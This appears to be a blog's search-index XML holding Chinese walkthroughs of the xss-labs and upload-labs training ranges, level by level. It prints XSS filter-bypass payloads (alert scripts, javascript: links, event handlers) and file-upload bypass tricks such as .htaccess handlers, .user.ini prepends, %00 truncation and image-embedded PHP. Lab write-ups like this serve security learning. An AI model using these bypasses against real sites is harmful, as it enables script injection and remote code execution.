<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>xss_lab题解</title>
    <link href="/2025/10/27/xss_lab%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/10/27/xss_lab%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss_lab"></a>xss_lab</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202839482.png" alt="image-20250225214917570"></p><p>name和网页相对应</p></li><li><p>直接在name&#x3D;xxxx写js代码进行盗取 <strong>实现弹窗</strong></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202840955.png" alt="image-20250225215318083"></p></li><li><pre><code class="json">name=&lt;script&gt;alert(1)&lt;/script&gt;<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">## 2</span><br><br><span class="hljs-bullet">-</span> keyword和网页相对应<br><br><span class="hljs-bullet">-</span> ![<span class="hljs-string">image-20250225215415349</span>](<span class="hljs-link">https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202842618.png</span>)<br><br>  无反应<br><br><span class="hljs-bullet">-</span> 查看源代码<br><br><span class="hljs-bullet">-</span> ![<span class="hljs-string">image-20250225215801590</span>](<span class="hljs-link">https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202845248.png</span>)<br><br>  ![<span class="hljs-string">image-20250225220029224</span>](<span class="hljs-link">https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251029212034332.png</span>)<br><br>  未闭合<br><br><span class="hljs-bullet">-</span> ![<span class="hljs-string">image-20250225220400827</span>](<span class="hljs-link">https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251029212038710.png</span>)<br><br>  <span class="hljs-code">```json</span><br><span class="hljs-code">  加一个“&gt;代表闭合</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202850161.png" alt="image-20250226170011929"></p><p>未闭合</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202851153.png" alt="image-20250226170515351"></p><p>单加一个<strong>‘单引号’</strong>   发现存在html转义编码”&lt;”&gt;”</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202852560.png" alt="image-20250227221510910"></p><p>使用onclick&#x3D;“copyText（）进行闭合<strong>（题目为单引号闭合）</strong></p></li><li><p>执行之后，点击搜索框<strong>触发</strong></p><p><strong>注：</strong>onclick&#x3D;“copyText（）</p><ul><li><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202853800.png" alt="image-20250227223100507"></li></ul></li></ul><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202855186.png" alt="image-20250227221954304"></p><p>点击查询查看</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202856970.png" alt="image-20250227222107620"></p><p>先闭合使用    <strong>“</strong></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202858663.png" alt="image-20250227222313266"></p><p>使用onclick&#x3D;“copyText（）<strong>（copyText（）为js弹窗脚本）</strong></p></li></ul><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202900495.png" alt="image-20250227223741540"></p><p>onclick出现下划线（过滤onclick）</p></li><li><p>使用超链接进行绕过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202901654.png" alt="image-20250227223939914"></p><p>在对话框写入</p><p>形成超链接，点击就可通过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202903576.png" alt="image-20250227224038881"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">”&gt;&lt;a href=&#x27;javascript<span class="hljs-punctuation">:</span>alert(<span class="hljs-number">1</span>)&#x27;&gt;<br></code></pre></td></tr></table></figure></li></ul><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><ul><li><p>再次写入超链接</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202905079.png" alt="image-20250227224252242"></p><p>href出现下划线（过滤href）</p></li><li><p>修改大小写</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">”&gt;&lt;a Href=&#x27;javasCript<span class="hljs-punctuation">:</span>alert(<span class="hljs-number">1</span>)&#x27;&gt;<br></code></pre></td></tr></table></figure><p>完成过滤</p></li></ul><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><ul><li><p>原代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202906538.png" alt="image-20250227224555322"></p><p>过滤为空</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202907901.png" alt="image-20250227224615994"></p><p>不是循环过滤（只过滤一次）</p></li><li><pre><code class="json">”&gt;&lt;a hrefhref=&#39;javascriptcript:alert(1)&#39;&gt;<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ruby">  <br>  多写几个即可绕过<br><br><span class="hljs-comment">## 8</span><br><br>- ![image-<span class="hljs-number">20250227224756097</span>](<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/cdn.jsdelivr.net/gh</span><span class="hljs-regexp">/zhz0177/picture</span>-bed<span class="hljs-variable">@main</span>/img/<span class="hljs-number">20251027202909167</span>.png)<br><br>  已经存在<br><br>  <span class="hljs-string">``</span><span class="hljs-string">`json</span><br><span class="hljs-string">  ”&gt;&lt;a href</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>在输入框直接写入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">javascript<span class="hljs-punctuation">:</span>alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202910629.png" alt="image-20250227224904878"></p><p>再次出现下划线过滤</p></li><li><p>修改大小写也不行</p></li><li><p>使用编码进行过滤</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202911638.png" alt="image-20250227225109222"></p></li></ul><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><ul><li><p>填入编码代价</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202918823.png" alt="image-20250227225155296"></p></li><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202924068.png" alt="image-20250227225232942"></p><p>没有写入http&#x2F;&#x2F; 就不可执行</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202925245.png" alt="image-20250227225340042"></p><p>存在干扰(http:&#x2F;&#x2F;干扰js代码)</p></li><li><p>使用&#x2F;&#x2F;进行注释</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202926894.png" alt="image-20250227225420332"></p></li></ul><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><ul><li><p>隐藏数据</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202928882.png" alt="image-20250227230159477"></p><p><strong>hidden</strong></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202931247.png" alt="image-20250227230424159"><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202934518.png" alt="image-20250227230424299"></p><p>相当于使用     <strong>t_sort</strong> 进行过滤</p><p>所以直接在t_sort加入js代码</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202936173.png" alt="image-20250227230537548"></p><p>存在”“闭合（记得闭合代码）</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202937319.png" alt="image-20250227230649653"></p><p>写入type&#x3D;”text“（屏蔽隐藏属性，出现搜索框）</p></li><li><p>点击搜索框后，触发点击绕过</p></li></ul><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202939442.png" alt="image-20250227231923294"></p><p>写入后，未显示搜索框</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202941685.png" alt="image-20250228231250310"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202942849.png" alt="image-20250228231322189"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202944464.png" alt="image-20250228231451655"></p><p>抓包输入返回值：referer：xxxxx（内容为显示内容 t_sort）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202947095.png" alt="image-20250228231600639"></p><p>出现value值</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202949907.png" alt="image-20250228231711702"></p><p>将编码内容进行修改即可</p></li></ul><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202952224.png" alt="image-20250228232439571"></p><p>接受浏览器权限</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202953319.png" alt="image-20250228232356850"></p><p>抓包后，在对应位置加入js代码</p></li></ul><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202954404.png" alt="image-20250302215338696"></p></li><li><p>修改为 </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-string">&quot; type=&#x27;text&#x27; onclick=&#x27;javascript:alert(1)&#x27;&gt;//</span><br></code></pre></td></tr></table></figure></li><li><p>出现对话框</p></li></ul><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>题目出错</p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><ul><li><p>源代码出现</p><p><strong>ng—include</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202956332.png" alt="image-20250302220337450"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202958110.png" alt="image-20250302220952244"></p><p>尖括号被屏蔽</p></li><li><p>无对话框，所以<strong>不使用onclick</strong>（点击）</p></li><li><p>使用img</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202959781.png" alt="image-20250302221510739"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251029215914259.png" alt="image-20251029215914230"></p><p>‘   ’为图片的格式</p></li></ul><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><ul><li><p>输入代码查看过滤</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203001876.png"></p><p>过滤了script和” ‘还有空格</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203003217.png" alt="image-20250302222242463"></p><p>a标签  绕过script过滤  回车代替空格</p></li><li><p>然后点击图片</p></li></ul><h2 id="17，18-不支持"><a href="#17，18-不支持" class="headerlink" title="17，18(不支持)"></a>17，18(不支持)</h2><ul><li><p>源代码使用到了<strong>embed</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203004735.png" alt="image-20250302223015962"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203006004.png" alt="image-20250302223312646"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">- xss-labs-master<span class="hljs-punctuation">:</span><span class="hljs-number">81</span>/level17.php?arg01=a&amp;arg02=b**<span class="hljs-number">123</span> onclick=&#x27;alert(<span class="hljs-number">1</span>)&#x27;**<br><br>  xss-labs-master<span class="hljs-punctuation">:</span><span class="hljs-number">81</span>/level17.php?arg01=a&amp;arg02=b**<span class="hljs-number">123</span> onmousedown=&#x27;alert(<span class="hljs-number">1</span>)&#x27;**<br><br><br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>靶场题解</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场题解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload_lab题解</title>
    <link href="/2025/10/27/upload_lab%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/10/27/upload_lab%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-lab"><a href="#upload-lab" class="headerlink" title="upload_lab"></a>upload_lab</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><ul><li>禁止使用js文件即可</li></ul><h2 id="2（MIME）"><a href="#2（MIME）" class="headerlink" title="2（MIME）"></a>2（MIME）</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202509346.png" alt="image-20250213005144971"></p><p>未限制类型</p><p>为白名单</p></li><li><p>提交php文件并且抓包绕过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202524969.png" alt="image-20250213005117515"></p></li><li><p>将Content-Type修改为if中的正确条件</p><p>（image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif）</p></li><li><p>forword提交</p></li></ol><h2 id="3（phph5和php3和phtml实现绕过）"><a href="#3（phph5和php3和phtml实现绕过）" class="headerlink" title="3（phph5和php3和phtml实现绕过）"></a>3（<strong>phph5和php3和phtml</strong>实现绕过）</h2><ol><li><p>确定类型<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202526624.png" alt="image-20250213011454171"></p><p>罗列<strong>黑名单</strong></p></li><li><p>直接通过<strong>phph5和php3和phtml</strong>实现绕过</p></li><li><p>.pht .php3 .php4 .php5 .php6 .php7 .php8 .phtml)</p></li></ol><h2 id="4（htaccess）"><a href="#4（htaccess）" class="headerlink" title="4（htaccess）"></a>4（htaccess）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202528987.png" alt="image-20250213012033408"></p><p>罗列<strong>黑名单</strong></p><p><strong>未屏蔽.htaccess</strong></p></li><li><p>htaccess实现文件解析自定义</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202530404.png" alt="image-20250213013048887">（名称任意）（保存后，修改文件后缀为**.htaccess**)</p></li><li><p>提交此文件    .htaccess</p></li><li><p>提交任意后缀的文件</p><p>（提交的文件名称与图片相互匹配)</p></li><li><p>所提交文件为php格式</p></li></ol><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250307181457737.png" alt="image-20250307181457737"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch .jpg&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><ul><li><p>提交a.jpg(写了php代码)</p></li><li><p>写一个   <strong>.user.ini文件</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></table></figure></li><li><p>提交后</p></li><li><p>访问readme.php</p></li></ul><h2 id="6（大小写）"><a href="#6（大小写）" class="headerlink" title="6（大小写）"></a>6（大小写）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202534518.png" alt="image-20250213013834182"></p><p>基本上禁用了所有后缀</p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>未禁用大小写</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202537001.png" alt="image-20250213014132854"></p><p>（没有这一条）</p></li><li><p>修改php为大写即可（PHP）</p></li></ol><h2 id="7（空格绕过）"><a href="#7（空格绕过）" class="headerlink" title="7（空格绕过）"></a>7（空格绕过）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202538742.png" alt="image-20250213014238310"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>缺少<strong>收尾去空</strong>（将字符串转化为空格，未去除空格）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202540684.png" alt="image-20250213014408766"></p><p>（没有这一条）</p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202542091.png" alt="image-20250213014649147"></p><p>在尾部加空格</p></li><li><p>forword提交</p></li></ol><h2 id="8（删除文件末尾的点）"><a href="#8（删除文件末尾的点）" class="headerlink" title="8（删除文件末尾的点）"></a>8（删除文件末尾的点）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202543627.png" alt="image-20250213015053022"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>缺少“删除文件末尾的点”</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202545767.png" alt="image-20250213015311465"></p><p>（没有这一条）</p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202547382.png" alt="image-20250213015448547"></p></li><li><p>forword提交</p></li></ol><h2 id="9（：：DATA）"><a href="#9（：：DATA）" class="headerlink" title="9（：：DATA）"></a>9（<strong>：：DATA</strong>）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202549962.png" alt="image-20250213015053022"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>缺少“将字符串转化为空格”</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202551794.png" alt="image-20250213015634038"></p><p>（没有这一条）</p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202553181.png" alt="image-20250213015800602"></p><p>在后面写<strong>：：DATA</strong></p></li><li><p>forword提交</p></li></ol><h2 id="10（只有一次过滤）"><a href="#10（只有一次过滤）" class="headerlink" title="10（只有一次过滤）"></a>10（只有一次过滤）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202554500.png" alt="image-20250213015053022"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>啥都不少，但是源代码<strong>只有一次过滤</strong></p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202556137.png" alt="image-20250213020343377"></p><p>多写几层</p></li><li><p>forword提交</p></li></ol><h2 id="11（过滤黑名单有的后缀）"><a href="#11（过滤黑名单有的后缀）" class="headerlink" title="11（过滤黑名单有的后缀）"></a>11（<strong>过滤黑名单有的后缀</strong>）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202557167.png" alt="image-20250213015053022"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>啥都不少，但是源代码<strong>只有一次过滤</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202558335.png" alt="image-20250213020702307"></p><p><strong>过滤黑名单有的后缀</strong></p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202559673.png" alt="image-20250213021057055"></p><p>多写几次</p></li><li><p>forword提交</p></li></ol><h2 id="12（-00截断）（get）"><a href="#12（-00截断）（get）" class="headerlink" title="12（%00截断）（get）"></a>12（%00截断）（get）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202600735.png" alt="image-20250213021159570"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>源代码满足多次过滤</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202602068.png" alt="image-20250213021313487"></p><p>（图中所示**+1即为循环**）</p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202603526.png" alt="image-20250213023637421"></p><p>修改提交路径</p><p>添加1.php%00</p><p>（%00会截断后面的部分，即xxx.jpg）</p></li><li><p>forword提交</p></li></ol><h2 id="13（-00截断）（post）"><a href="#13（-00截断）（post）" class="headerlink" title="13（%00截断）（post）"></a>13（%00截断）（post）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202604714.png" alt="image-20250213023909677"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>源代码满足多次过滤</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202607016.png" alt="image-20250213021313487"></p><p>（图中所示**+1即为循环**）</p></li><li><p>为post提交方式</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202608553.png" alt="image-20250213030200898"></p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202614443.png" alt="image-20250213030336875"></p><p>修改提交路径</p><p>添加1.php%00</p><p>（%00会截断后面的部分，即xxx.jpg）</p></li><li><p>post提交需要编码%00</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202618967.png" alt="image-20250213030458867"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202620933.png" alt="image-20250213030648499"></p></li><li><p>forword提交</p></li></ol><h2 id="14-图片码"><a href="#14-图片码" class="headerlink" title="14(图片码)"></a>14(图片码)</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">查看提示，说检查图片内容开头两个字节。<br><br>PEG/IFIF（常见的照片格式)：头两个字节为·<span class="hljs-number">0</span> xFF·<span class="hljs-number">0</span>xD8。<br><br>PNG（无损压缩格式)：头两个字节为·<span class="hljs-number">0</span>x89·<span class="hljs-number">0</span>x50。<br><br>GIF（支持动画的图像格式)：头两个字节为·<span class="hljs-number">0</span>x47·<span class="hljs-number">0</span>x49。<br><br><span class="hljs-function"><span class="hljs-title">BMP</span><span class="hljs-params">(Windows位图格式)</span></span>：头两个字节为·<span class="hljs-number">0</span>x42·<span class="hljs-number">0</span>x4D。<br><br><span class="hljs-function"><span class="hljs-title">TFF</span><span class="hljs-params">(标签图像文件格式)</span></span>：头两个字节可以是不同的数值<br></code></pre></td></tr></table></figure><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202623263.png" alt="image-20250213023909677"></p></li><li><p>根据题目要求，将png文件，php文件打开</p><p>将php中代码粘贴·到png中———&gt;生成一个新文件为jpg的文件</p><p>（上传图片，所以是<strong>jpg格式</strong>的）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202626542.png" alt="image-20250213230853507"></p></li><li><p>配合文件包含漏洞–将图片转化为php代码执行</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202631596.png" alt="image-20250213231620298"></p><p>（file的名称为所上传图片的地址）</p></li></ol><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202634747.png" alt="image-20250213233806957"></p></li><li><p>函数表名，只能提交图像（不是图像无法执行）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202636849.png" alt="image-20250213233915636"></p></li></ol><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202638146.png" alt="image-20250213234142840"></p></li><li><p>函数表名，只能提交图像（不是图像无法执行）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202639952.png" alt="image-20250213234202315"></p></li><li></li></ol><h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202641450.png" alt="image-20250213234350113"></p></li><li><p>函数表名，只能提交图像（不是图像无法执行）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202643388.png" alt="image-20250213234408359"></p></li></ol><h2 id="18（二次渲染）（条件竞争）"><a href="#18（二次渲染）（条件竞争）" class="headerlink" title="18（二次渲染）（条件竞争）"></a>18（二次渲染）（条件竞争）</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202646712.png" alt="image-20250214003010406"></p></li><li><p>先移动，再条件</p></li><li></li></ol><h2 id="19（二次渲染）（条件竞争）"><a href="#19（二次渲染）（条件竞争）" class="headerlink" title="19（二次渲染）（条件竞争）"></a>19（二次渲染）（条件竞争）</h2><p>1. </p><h2 id="20（黑名单下：文件夹名称）"><a href="#20（黑名单下：文件夹名称）" class="headerlink" title="20（黑名单下：文件夹名称）"></a>20（黑名单下：文件夹名称）</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202648354.png" alt="image-20250214003208206"></p></li><li><p>最终判定的条件名称(if)与提交文件名（post save_name）有关</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202649938.png" alt="image-20250214003543621"></p></li><li><p>抓包，末尾添加饶过的词语</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202656931.png" alt="image-20250214003705994"></p><p><strong>或者</strong></p><ol><li><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202658581.png" alt="image-20250214004038208"></li><li>抓包，末尾添加饶过的词语，变成文件夹名称</li><li><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202659839.png" alt="image-20250214004120826"></li></ol></li></ol><h2 id="21（白名单下：文件夹名称）"><a href="#21（白名单下：文件夹名称）" class="headerlink" title="21（白名单下：文件夹名称）"></a>21（白名单下：文件夹名称）</h2><ol><li><p>查看源代码<img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250214004247923.png" alt="image-20250214004247923"></p></li><li><p>数组影响最后结果</p><p>save_name[0]影响文件名称</p><p>save_name[1]写不写都行（为一个点）</p><p>save_name[2]文件后缀</p></li><li><p>抓包进行修改<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202702765.png" alt="image-20250214005515857"></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202705438.png" alt="image-20250214005702713"></p><p>（类似这种情况的文件名上传）</p>]]></content>
    
    
    <categories>
      
      <category>靶场题解</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场题解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlilab题解&amp;&amp;总结</title>
    <link href="/2025/10/27/sqlilab%E9%A2%98%E8%A7%A3&amp;&amp;%E6%80%BB%E7%BB%93/"/>
